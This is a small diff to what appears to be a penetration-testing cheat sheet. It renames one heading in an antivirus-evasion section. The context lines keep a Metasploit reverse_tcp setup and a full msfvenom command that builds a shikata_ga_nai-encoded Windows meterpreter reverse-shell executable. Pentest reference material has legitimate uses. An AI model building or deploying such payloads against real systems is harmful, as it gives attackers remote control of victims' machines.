@@ -246,7 +246,7 @@ meterpreter/reverse_tcp; set LHOST <IP>; set LPORT
 ---
 # Antivirus-Evasion-Anti-Forensics
 ## Using-Encoders
-### shikata_ga_nai encoder
+### shikata_ga_nai_encoder
 This is not the best way to evade a modern AV because it's easilty detected even after multiple encoding iterations. 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -e x86/shikata_ga_nai -i 5 -f exe -O ./reverse.exe
